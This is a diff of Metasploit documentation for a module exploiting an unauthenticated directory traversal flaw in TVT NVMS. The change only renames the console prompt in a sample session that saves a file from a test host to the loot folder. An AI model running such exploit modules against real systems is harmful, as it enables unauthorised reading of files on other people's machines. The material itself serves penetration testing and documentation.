@@ -18,14 +18,14 @@ This module exploits an unauthenticated directory traversal vulnerability which 
 ### Tested against Windows 7 SP1
 
 ```
-msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS 192.168.43.152
+msf auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS 192.168.43.152
 RHOSTS => 192.168.43.152
-msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run
+msf auxiliary(scanner/http/tvt_nvms_traversal) > run
 
 [+] File saved in: /root/.msf4/loot/20191230124941_default_192.168.43.152_nvms.traversal_240600.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/http/tvt_nvms_traversal) >
+msf auxiliary(scanner/http/tvt_nvms_traversal) >
 ```
 
 ## References
